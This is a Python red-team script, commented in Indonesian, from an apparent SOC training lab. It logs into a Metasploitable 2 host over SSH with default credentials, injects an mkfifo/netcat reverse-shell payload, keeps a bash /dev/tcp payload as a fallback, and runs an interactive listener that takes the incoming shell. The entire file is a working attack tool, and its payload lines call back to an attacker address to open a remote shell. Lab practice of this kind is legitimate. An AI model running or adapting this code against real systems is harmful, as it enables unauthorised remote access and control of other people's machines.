#!/usr/bin/env python3
"""
=============================================================
  Mini SOC Project — Person A (Red Team)
  Scenario 3: Reverse Shell
=============================================================
  Target  : Metasploitable 2 @ 192.168.100.40
  Attacker: Kali Linux       @ 192.168.100.160
  Tactic  : T1059 - Command & Scripting Interpreter (MITRE ATT&CK)
            T1071 - Application Layer Protocol
  Tools   : paramiko (SSH), socket (listener)
=============================================================
"""

import paramiko
import socket
import threading
import time
import datetime
import sys
import select

# ── Konfigurasi ──────────────────────────────────────────
TARGET_IP   = "192.168.100.40"
TARGET_PORT = 22
ATTACKER_IP = "192.168.100.160"
LISTEN_PORT = 4444

SSH_USER    = "msfadmin"
SSH_PASS    = "msfadmin"

# mkfifo payload — lebih reliable dari /dev/tcp di shell non-interaktif
# Ini tidak bergantung pada bash built-in /dev/tcp yang kadang dinonaktifkan
REVSHELL_CMD = (
    f"rm -f /tmp/.rf; mkfifo /tmp/.rf; "
    f"cat /tmp/.rf | /bin/bash -i 2>&1 | nc {ATTACKER_IP} {LISTEN_PORT} > /tmp/.rf"
)

# Fallback jika nc tidak ada di target (Metasploitable punya nc, jadi ini aman)
REVSHELL_CMD_DEVTCP = (
    f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{LISTEN_PORT} 0>&1'"
)

BANNER = """
╔══════════════════════════════════════════════════════╗
║        MINI SOC — SCENARIO 3: REVERSE SHELL          ║
║  Target  : {target:<38} ║
║  Listener: {listener:<38} ║
║  Time    : {time:<38} ║
╚══════════════════════════════════════════════════════╝
"""

# ── Event: sinyal bahwa listener sudah siap sebelum SSH trigger ──
listener_ready = threading.Event()


# ══════════════════════════════════════════════════════════
#  BAGIAN 1: Listener
# ══════════════════════════════════════════════════════════

def start_listener(listen_ip: str, listen_port: int):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((listen_ip, listen_port))
    except OSError as e:
        print(f"[!] Gagal bind {listen_ip}:{listen_port} — {e}")
        print(f"[!] Port mungkin sudah dipakai. Coba: sudo lsof -i :{listen_port}")
        listener_ready.set()   # unblock trigger thread agar tidak hang
        sys.exit(1)

    server.listen(1)
    print(f"[*] Listener aktif di {listen_ip}:{listen_port}")
    print(f"[*] Menunggu koneksi balik dari target...\n")

    # Sinyal ke trigger thread — listener sudah siap
    listener_ready.set()

    server.settimeout(35)

    try:
        conn, addr = server.accept()
    except socket.timeout:
        print("\n[!] Timeout — target tidak konek dalam 35 detik.")
        print("[!] Tips:")
        print("    - Pastikan tidak ada firewall yang blok port 4444")
        print("    - Coba: sudo ufw allow 4444/tcp")
        print("    - Test manual: buka terminal lain → nc -lvnp 4444")
        print(f"    - Lalu SSH manual dan jalankan: {REVSHELL_CMD}")
        server.close()
        return

    print(f"[+] ✅ KONEKSI MASUK dari {addr[0]}:{addr[1]}")
    print(f"[+] Reverse shell aktif! Ketik perintah (exit/quit untuk keluar):\n")
    print(f"{'═'*54}")

    conn.setblocking(False)

    try:
        while True:
            # Gunakan select() agar bisa baca dari socket DAN stdin bersamaan
            readable, _, _ = select.select([conn, sys.stdin], [], [], 0.1)

            for src in readable:
                if src is conn:
                    try:
                        data = conn.recv(4096)
                        if not data:
                            print("\n[*] Koneksi ditutup oleh target.")
                            return
                        print(data.decode(errors="replace"), end="", flush=True)
                    except (ConnectionResetError, BrokenPipeError):
                        print("\n[*] Koneksi terputus.")
                        return

                elif src is sys.stdin:
                    cmd = sys.stdin.readline()
                    if not cmd:
                        return
                    if cmd.strip().lower() in ("exit", "quit", "q"):
                        try:
                            conn.send(b"exit\n")
                        except Exception:
                            pass
                        return
                    try:
                        conn.send(cmd.encode())
                    except (BrokenPipeError, OSError):
                        print("\n[*] Gagal kirim perintah — koneksi terputus.")
                        return

    except KeyboardInterrupt:
        print("\n[*] Sesi dihentikan (Ctrl+C).")
    finally:
        try:
            conn.close()
        except Exception:
            pass
        server.close()
        print(f"\n{'═'*54}")
        print("[*] Listener ditutup.")


# ══════════════════════════════════════════════════════════
#  BAGIAN 2: SSH Trigger
# ══════════════════════════════════════════════════════════

def trigger_reverseshell(target: str, port: int, user: str, password: str, cmd: str):
    # Tunggu sampai listener benar-benar siap (bukan sleep hardcode)
    print("[*] Menunggu listener siap...")
    listener_ready.wait(timeout=10)
    time.sleep(0.5)   # sedikit buffer setelah bind

    print(f"[*] SSH ke {target}:{port} sebagai {user}...")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname  = target,
            port      = port,
            username  = user,
            password  = password,
            timeout   = 10,
            # Matikan agent & look_for_keys — lebih cepat di env lab
            look_for_keys    = False,
            allow_agent      = False,
        )
        print(f"[+] SSH berhasil!")
        print(f"[*] Payload: {cmd}\n")

        # Buka channel interaktif lewat invoke_shell, bukan exec_command
        # exec_command dengan get_pty tidak bisa forward reverse shell dengan benar
        channel = client.invoke_shell()
        time.sleep(0.5)
        channel.send(cmd + "\n")

        # Biarkan channel tetap hidup selama listener masih aktif
        # Channel akan otomatis mati saat listener ditutup atau script exit
        timeout = 40
        elapsed = 0
        while elapsed < timeout:
            time.sleep(1)
            elapsed += 1
            if channel.closed:
                break

    except paramiko.AuthenticationException:
        print(f"[!] SSH auth gagal ({user}:{password})")
        print(f"[!] Jalankan Scenario 2 dulu untuk credential yang valid.")
    except (socket.timeout, paramiko.SSHException, OSError) as e:
        print(f"[!] SSH error: {e}")
    finally:
        try:
            client.close()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════

if __name__ == "__main__":
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(BANNER.format(
        target   = f"{TARGET_IP}:{TARGET_PORT}",
        listener = f"{ATTACKER_IP}:{LISTEN_PORT}",
        time     = now,
    ))

    print(f"[*] Step 1: Membuka listener di {ATTACKER_IP}:{LISTEN_PORT}")
    print(f"[*] Step 2: SSH ke {TARGET_IP} → trigger reverse shell")
    print(f"[*] Step 3: Target konek balik → interactive shell\n")

    # SSH trigger di background thread
    trigger_thread = threading.Thread(
        target = trigger_reverseshell,
        args   = (TARGET_IP, TARGET_PORT, SSH_USER, SSH_PASS, REVSHELL_CMD),
        daemon = True,
    )
    trigger_thread.start()

    # Listener di main thread (blocking sampai sesi selesai)
    start_listener(ATTACKER_IP, LISTEN_PORT)